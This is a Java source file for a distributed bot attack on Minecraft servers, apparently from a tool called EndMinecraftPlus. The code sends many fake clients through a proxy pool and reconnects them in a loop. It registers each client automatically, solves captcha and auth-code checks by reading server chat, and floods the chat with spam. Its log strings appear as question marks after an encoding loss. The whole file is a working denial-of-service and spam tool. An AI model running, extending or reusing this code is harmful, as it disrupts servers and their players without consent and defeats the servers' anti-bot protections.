package luohuayu.EndMinecraftPlus.tasks.attack;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.net.Proxy.Type;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.Session;
import org.spacehq.packetlib.event.session.ConnectedEvent;
import org.spacehq.packetlib.event.session.DisconnectedEvent;
import org.spacehq.packetlib.event.session.DisconnectingEvent;
import org.spacehq.packetlib.event.session.PacketReceivedEvent;
import org.spacehq.packetlib.event.session.PacketSentEvent;
import org.spacehq.packetlib.event.session.SessionListener;
import org.spacehq.packetlib.tcp.TcpSessionFactory;
import org.spacehq.packetlib.packet.*;
import org.spacehq.mc.protocol.packet.ingame.client.player.ClientSwingArmPacket;
import org.spacehq.mc.protocol.packet.ingame.client.player.ClientChangeHeldItemPacket;
import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerRotationPacket;

import luohuayu.ACProtocol.ACProtocol;
import luohuayu.EndMinecraftPlus.Utils;
import luohuayu.EndMinecraftPlus.proxy.ProxyPool;
import luohuayu.MCForgeProtocol.MCForge;
import xyz.yuanpi.config;

public class DistributedBotAttack extends IAttack {
	private Thread mainThread;
	private Thread tabThread;
	private Thread taskThread;
	private Thread spamThread;
	private Thread regThread;
	String spammessage;

	public List<Client> clients = new ArrayList<Client>();
	public ExecutorService pool = Executors.newCachedThreadPool();

	private ACProtocol acp = new ACProtocol();

	private long starttime;

	public DistributedBotAttack(int time, int maxconnect, int joinsleep, boolean motdbefore, boolean tab,
			HashMap<String, String> modList) {
		super(time, maxconnect, joinsleep, motdbefore, tab, modList);
	}

	public static Scanner scanner = new Scanner(System.in);
	Proxy.Type pType;
	String name;
	boolean custspam;
	boolean autoauth;
	boolean spam;
	boolean debug;
	boolean test;
	int spamdelay;

	public void start(final String ip, final int port) {
		spamdelay = config.toint(config.getValue("spamdelay"));
		debug = config.getBoolean("debug");
		Utils.log("???????????????????????????CNMD ????????????????????????");
		name = config.getValue("name");
		Utils.log("????????????" + name);

		Utils.log("????????????????????????HTTP/SOCKS");
		String pxty = config.getValue("pxtype");
		switch (pxty) {
			case "http":
				pType = Type.HTTP;
				break;
			case "socks":
				pType = Type.SOCKS;
				break;
			default:
				Utils.log("????????? ??????");
				stop();

		}
		Utils.log("????????????????????????????????? t/f");
		autoauth = config.getBoolean("captcha");
		Utils.log("?????????????????? t/f");
		spam = config.getBoolean("spam");
		custspam = config.getBoolean("customspam");
		if (custspam) {
			spammessage = config.getValue("custommessage");

		}
		this.starttime = System.currentTimeMillis();

		mainThread = new Thread(() -> {
			while (true) {
				try {
					cleanClients();
					createClients(ip, port);
					Utils.sleep(1 * 1000);

					Utils.log("BotThread", "?????????:" + clients.size());
				} catch (Exception e) {
					Utils.log("BotThread", e.getMessage());
				}
			}
		});
		regThread = new Thread(() -> {
			int num = 0;
			String passwd = Utils.getRandomString(8, 12);
			while (num < 10) {
				try {
					synchronized (clients) {
						clients.forEach(c -> {
							if (c.getSession().isConnected()) {
								if (c.getSession().hasFlag("join")) {
									c.getSession().send(new ClientChatPacket("/reg " + passwd + " " + passwd));

								}
							}
						});
					}
					num++;
					Thread.sleep(2000);
				} catch (Exception e1) {
					// TODO: handle exception
				}
			}

		});

		if (spam) {
			spamThread = new Thread(() -> {
				while (true) {
					try {
						synchronized (clients) {
							clients.forEach(c -> {
								if (c.getSession().isConnected()) {
									if (c.getSession().hasFlag("join")) {
										spammer(c.getSession(), spammessage);

									}
								}
							});
						}
						Thread.sleep(spamdelay);
					} catch (Exception e) {
					}

				}
			});
		}

		tabThread = new Thread(() -> {
			while (true) {
				synchronized (clients) {
					clients.forEach(c -> {
						if (c.getSession().isConnected()) {
							if (c.getSession().hasFlag("join")) {
								sendTab(c.getSession(),
										"//");
							}
						}
					});
				}
				Utils.sleep(100);
			}
		});

		// test = config.getBoolean("test");
		// if (test) {
		// Utils.log("?????????????????????????????????");
		// String username = name + Utils.getRandomString(4, 8);
		// Client client = new Client(ip, port, new MinecraftProtocol("112121145"),
		// new TcpSessionFactory());
		// newlistener(client, "112121145", ip, port);
		// client.getSession().connect();
		// } else if (true) {
		mainThread.start();
		// }
		regThread.start();
		if (tabThread != null)
			tabThread.start();
		if (taskThread != null)
			taskThread.start();
		if (spam)
			spamThread.start();
	}

	@SuppressWarnings("deprecation")
	public void stop() {
		mainThread.stop();
		if (tabThread != null)
			tabThread.stop();
		if (taskThread != null)
			taskThread.stop();
		if (spamThread != null)
			spamThread.stop();
	}

	public void setTask(Runnable task) {
		taskThread = new Thread(task);
	}

	private void cleanClients() {
		List<Client> waitRemove = new ArrayList<Client>();
		synchronized (clients) {
			clients.forEach(c -> {
				if (!c.getSession().isConnected()) {
					waitRemove.add(c);
				}
			});
			clients.removeAll(waitRemove);
		}
	}

	private void createClients(final String ip, int port) {
		synchronized (ProxyPool.proxys) {
			ProxyPool.proxys.forEach(p -> {
				try {
					String[] _p = p.split(":");
					Proxy proxy = new Proxy(pType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
					Client client = createClient(ip, port, name + Utils.getRandomString(4, 8), proxy);
					client.getSession().setReadTimeout(10 * 1000);
					client.getSession().setWriteTimeout(10 * 1000);
					synchronized (clients) {
						clients.add(client);
					}

					if (this.attack_motdbefore) {
						pool.submit(() -> {
							getMotd(proxy, ip, port);
							client.getSession().connect(false);
						});
					} else {
						client.getSession().connect(false);
					}

					if (this.attack_joinsleep > 0)
						Utils.sleep(attack_joinsleep);
				} catch (Exception e) {
					Utils.log("BotThread/CreateClients", e.getMessage());
				}
			});
		}
	}

	public Client createClient(final String ip, int port, final String username, Proxy proxy) {
		Client client = new Client(ip, port, new MinecraftProtocol(username), new TcpSessionFactory(proxy));
		new MCForge(client.getSession(), this.modList).init();
		client.getSession().addListener(new SessionListener() {
			public void packetReceived(PacketReceivedEvent e) {
				if (e.getPacket() instanceof ServerChatPacket) {
					ServerChatPacket packet = e.getPacket();
					String message = packet.getMessage().toString();
					if (debug) {
						Utils.log("[" + username + "]" + "[????????????]" + "[" + message + "]");
					}
					boolean reg = message.contains("?????????") || message.contains("reg");
					if (reg) {
						String passwd = Utils.getRandomString(8, 12);
						client.getSession().send(new ClientChatPacket("/register " + passwd + " " + passwd));
					}
					if (true) {
						// try to get authme code
						boolean iscaptcha = message.contains("????????????") || message.contains("captcha")
								|| message.contains("?????????");
						boolean isauthcode = message.contains("?????????????????????");
						String[] code2 = message.split("/captcha ", 2);
						if (iscaptcha) {
							String c0de = code2[1].substring(0, 5);
							if (debug) {
								Utils.log("Captcha is:" + c0de);
							}
							client.getSession().send(new ClientChatPacket("/captcha " + c0de));
						}
						if (isauthcode) {
							String authcode = Utils.getcode(8, message);
							if (debug) {
								Utils.log(username + " ???????????????" + authcode);
							}
							client.getSession().send(new ClientChatPacket(authcode));

						}
					}
				}

				if (e.getPacket() instanceof ServerJoinGamePacket) {
					e.getSession().setFlag("join", true);
					Utils.log("Client", "[????????????][" + username + "]");

				}
			}

			public void packetSent(PacketSentEvent e) {
				if (debug) {
					if (e.getPacket() instanceof ClientChatPacket) {
						ClientChatPacket packet = e.getPacket();
						String sendmessage;
						sendmessage = packet.getMessage();
						Utils.log("[Client]" + "[" + username + "]" + "[????????????]" + sendmessage);
					}
				}
			}

			public void connected(ConnectedEvent e) {
			}

			public void disconnecting(DisconnectingEvent e) {
			}

			public void disconnected(DisconnectedEvent e) {
				String msg;
				if (e.getCause() != null) {
					msg = e.getCause().getMessage();
				} else {
					msg = e.getReason();
				}
				Utils.log("Client", "[??????][" + username + "] " + msg);
				String reason = e.getReason();
				boolean status = reason.contains("???");
				boolean status1 = reason.contains("join");
				if (status || status1) {
					Utils.log("[" + username + "]????????????......");
					Client client = new Client(ip, port, new MinecraftProtocol(username), new TcpSessionFactory(proxy));
					client.getSession().connect(true);
					if (debug) {
						Utils.log("[Listener]" + "[" + username + "]" + ip + "," + proxy.toString());
					}

				}
			}

		});
		return client;

	}

	public boolean getMotd(Proxy proxy, String ip, int port) {
		try {
			Socket socket = new Socket(proxy);
			socket.connect(new InetSocketAddress(ip, port));
			if (socket.isConnected()) {
				OutputStream out = socket.getOutputStream();
				InputStream in = socket.getInputStream();
				out.write(new byte[] { 0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01 });
				out.write(new byte[] { 0x01, 0x00 });
				out.flush();
				in.read();

				try {
					in.close();
					out.close();
					socket.close();
				} catch (Exception e) {
				}

				return true;
			}
			socket.close();
		} catch (Exception e) {
		}
		return false;
	}

	public void sendTab(Session session, String text) {
		try {
			session.send((Packet) new ClientSwingArmPacket());
			session.send((Packet) new ClientChangeHeldItemPacket(1 + new Random().nextInt(8)));
			session.send((new ClientKeepAlivePacket(1)));
		} catch (Exception e) {
		}
	}

	public void spammer(Session session, String message) {
		if (!custspam) {
			message = Utils.getclnmsl();
		}
		session.send((Packet) new ClientChatPacket(message + Utils.getRandomString(3, 5)));
	}

	public void reg(Session session) {
		try {
			String passwd = Utils.getRandomString(8, 12);
			session.send(
					new ClientChatPacket("/reg " + passwd + " " + passwd));
			// String email;
			// email = Utils.getRandomString(4, 8) + "@163.com";
			// session.send(new ClientChatPacket("/emailplus bind " + email));
			// session.send(new ClientChatPacket("/email add " + email + "@163.com "
			// + email + "@163.com"));
			// Thread.sleep(3000);
			// session.send(new ClientChatPacket("/hub"));
			// session.send(new ClientChatPacket("/lobby"));
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}
